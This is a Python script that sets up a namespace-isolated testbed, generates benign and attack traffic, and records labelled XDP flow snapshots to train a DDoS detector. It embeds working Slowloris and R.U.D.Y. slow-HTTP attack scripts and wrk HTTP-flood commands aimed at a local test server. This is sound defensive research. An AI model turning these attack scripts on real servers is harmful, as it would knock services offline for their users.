#!/usr/bin/env python3
"""Tier-1 T1a — capture a testbed-native, labelled flow dataset.

Builds the testbed (server + legit + botnet namespaces), attaches the production
XDP flow tracker, generates benign (legit ns) and attack (botnet ns) traffic, and
snapshots flow_map every poll — recording one labelled sample per flow-snapshot,
the exact unit control_plane will read at inference. This eliminates the source
confound AND the environment domain gap (training == deployment pipeline).

Run: sudo ./venv/bin/python capture_testbed_dataset.py
Output: training_data/testbed_flows.csv
"""
import subprocess, time, os, sys, textwrap, ctypes, socket, struct, random
import pandas as pd
from bcc import BPF

SIP = "10.0.0.1"
LEGIT = [f"10.0.1.{i}" for i in range(1, 13)]    # 12 benign clients
BOTS  = [f"10.0.2.{i}" for i in range(1, 5)]      # 4 attackers
ATTACK_CAP_PER_POLL = 150                          # keep benign:attack ratio sane
BR = "cap_br0"
OUT = "training_data/testbed_flows.csv"
SCR = "/tmp/claude-1000/-home-artur-DDoS-mitigation-code/d1a6f299-2ac9-49c8-8641-3d4d2f8f3077/scratchpad"
FEATS = ["Init_Win_bytes_forward","Fwd IAT Total","Fwd Header Length","Fwd IAT Max",
         "Fwd Packet Length Max","Fwd IAT Mean","Fwd Packets/s","Total Length of Fwd Packets"]

libc = ctypes.CDLL("libc.so.6", use_errno=True); CLONE_NEWNET = 0x40000000
def enter(fd):
    if libc.setns(fd, CLONE_NEWNET) != 0:
        e = ctypes.get_errno(); raise OSError(e, os.strerror(e))
def run(cmd, ns=None, bg=False):
    c = (["ip","netns","exec",ns] if ns else []) + (cmd.split() if isinstance(cmd,str) else cmd)
    return subprocess.Popen(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) if bg \
        else subprocess.run(c, capture_output=True, text=True)

ALL_NS = ["cap_srv"] + [f"cap_l{i}" for i in range(len(LEGIT))] + [f"cap_b{i}" for i in range(len(BOTS))]
def cleanup():
    for p in ("http.server","_cap_slow","_cap_rudy","hping3","wrk"):
        subprocess.run(["pkill","-9","-f",p], capture_output=True)
    for ns in ALL_NS: run(["ip","netns","del",ns])
    r = subprocess.run(["ip","-o","link","show"], capture_output=True, text=True)
    for line in (r.stdout or "").splitlines():
        name = line.split(":")[1].strip().split("@")[0]
        if name.startswith(("ve_cap",)): run(["ip","link","del",name])
    run(["ip","link","del",BR]); time.sleep(0.5)

def mk(ns, ip, veth):
    run(["ip","netns","add",ns])
    run(["ip","link","add",veth,"type","veth","peer","name",veth+"b"])
    run(["ip","link","set",veth,"netns",ns])
    run(["ip","link","set",veth+"b","master",BR]); run(["ip","link","set",veth+"b","up"])
    run(f"ip addr add {ip}/16 dev {veth}", ns=ns); run(f"ip link set {veth} up", ns=ns)
    run("ip link set lo up", ns=ns)
    if run(f"ip link show {veth}", ns=ns).returncode != 0:
        raise SystemExit(f"[!] {veth} not in {ns} (race) — re-run")

root_fd = os.open("/proc/self/ns/net", os.O_RDONLY)
cleanup()
run(["ip","link","add",BR,"type","bridge"]); run(["ip","link","set",BR,"up"])
sv = mk("cap_srv", SIP, "ve_cap_s") or "ve_cap_s"; sv = "ve_cap_s"
for i, ip in enumerate(LEGIT): mk(f"cap_l{i}", ip, f"ve_cap_l{i}")
for i, ip in enumerate(BOTS):  mk(f"cap_b{i}", ip, f"ve_cap_b{i}")
run(f"ethtool -K {sv} tx off rx off", ns="cap_srv")
run(["python3","-m","http.server","80"], ns="cap_srv", bg=True); time.sleep(1)

enter(os.open("/var/run/netns/cap_srv", os.O_RDONLY))
b = BPF(src_file="xdp_ddos_filter.c")
b.attach_xdp(sv, b.load_func("xdp_ddos_mitigation", BPF.XDP), flags=BPF.XDP_FLAGS_SKB_MODE)
flow = b.get_table("flow_map")
print("[*] XDP attached; starting legit traffic + attack schedule...")

# continuous benign: each legit ns loops curls at a human-ish cadence
for i in range(len(LEGIT)):
    run(["bash","-c", f"while true; do curl -s -o /dev/null --max-time 5 http://{SIP}/; "
                       f"sleep 0.$((RANDOM%9+1)); done"], ns=f"cap_l{i}", bg=True)

slow = f"{SCR}/_cap_slow.py"; rudy = f"{SCR}/_cap_rudy.py"
open(slow,"w").write(textwrap.dedent(f'''
    import socket,random,time
    s=[]
    for _ in range(30):
        try:
            c=socket.socket(); c.settimeout(4); c.connect(("{SIP}",80))
            c.send(f"GET /?{{random.randint(0,9999)}} HTTP/1.1\\r\\nHost: {SIP}\\r\\n".encode()); s.append(c)
        except: pass
    t=time.time()
    while time.time()-t<20:
        for c in list(s):
            try: c.send(f"X-a: {{random.randint(1,9)}}\\r\\n".encode())
            except: s.remove(c)
        time.sleep(2)'''))
open(rudy,"w").write(textwrap.dedent(f'''
    import socket,random,time
    s=[]
    for _ in range(30):
        try:
            c=socket.socket(); c.settimeout(4); c.connect(("{SIP}",80))
            c.send(f"POST /?{{random.randint(0,9999)}} HTTP/1.1\\r\\nHost: {SIP}\\r\\n".encode())
            c.send(b"Content-Length: 1000000\\r\\n\\r\\n"); s.append(c)
        except: pass
    t=time.time()
    while time.time()-t<20:
        for c in list(s):
            try: c.send(b"a")
            except: s.remove(c)
        time.sleep(3)'''))

# attack schedule: (start_sec, end_sec, label, launcher(bot_ns))
def L(cmd): return lambda ns: run(cmd, ns=ns, bg=True)
# GRU domain = L7/application attacks (the ones that evade L4 thresholds). The
# L4 floods (SYN/UDP/ACK) are the XDP threshold engine's job (decision 2) and are
# intentionally excluded so the GRU isn't trained on millions of 1-packet flows.
SCHED = [
    (15, 40, L(f"wrk -t2 -c40 -d25s http://{SIP}/")),              # HTTP flood (Hulk-like)
    (42, 68, L(f"python3 {slow}")),                                 # Slowloris
    (70, 96, L(f"python3 {rudy}")),                                 # R.U.D.Y.
    (98, 122, L(f"wrk -t3 -c60 -d24s http://{SIP}/")),              # HTTP flood (heavier)
]
TOTAL = 125
def ip_str(v): return socket.inet_ntoa(struct.pack("=I", v))

rows, started, prev_pk = [], set(), {}
for t in range(TOTAL):
    for idx, (s0, s1, launch) in enumerate(SCHED):
        if t == s0 and idx not in started:
            for i in range(len(BOTS)): launch(f"cap_b{i}")
            started.add(idx)
        if t == s1:
            for p in ("wrk","_cap_slow","_cap_rudy"):
                for i in range(len(BOTS)): run(["pkill","-9","-f",p], ns=f"cap_b{i}")
    time.sleep(1)
    # snapshot: ONLY flows active since last poll (fwd packets advanced) — matches
    # how control_plane evaluates active flows at inference, and avoids re-emitting
    # stale flows (which previously inflated the dataset).
    ben, att = [], []
    for k, v in flow.items():
        key = (k.src_ip, k.src_port, k.dst_port, k.proto)
        pk = v.fwd_packets
        if prev_pk.get(key, 0) >= pk:
            continue
        prev_pk[key] = pk
        sip = ip_str(k.src_ip)
        lab = 0 if sip.startswith("10.0.1.") else (1 if sip.startswith("10.0.2.") else -1)
        if lab < 0: continue
        dur = v.last_seen_ns - v.first_seen_ns
        row = [sip, k.src_port, k.dst_port, k.proto,
               v.init_win, dur/1000.0, v.fwd_hdr_bytes, v.iat_max_ns/1000.0,
               v.fwd_pkt_len_max, (dur/1000.0)/(pk-1) if pk > 1 else 0.0,
               pk/(dur/1e9) if dur > 0 else 0.0, v.fwd_payload_bytes, lab, t]
        (ben if lab == 0 else att).append(row)
    if len(att) > ATTACK_CAP_PER_POLL:
        att = random.sample(att, ATTACK_CAP_PER_POLL)
    rows.extend(ben); rows.extend(att)
    if t % 10 == 0:
        print(f"  t={t:3d}s  active benign={len(ben)} attack(capped)={len(att)}  total_rows={len(rows)}")

b.remove_xdp(sv, flags=BPF.XDP_FLAGS_SKB_MODE)
enter(root_fd); cleanup()

cols = ["src_ip","src_port","dst_port","proto"] + FEATS + ["y","poll"]
df = pd.DataFrame(rows, columns=cols)
os.makedirs("training_data", exist_ok=True); df.to_csv(OUT, index=False)
print(f"\n[+] wrote {OUT}: {len(df)} samples  benign={(df.y==0).sum()} attack={(df.y==1).sum()}")
print("    unique benign IPs:", df[df.y==0].src_ip.nunique(), "| unique attack IPs:", df[df.y==1].src_ip.nunique())
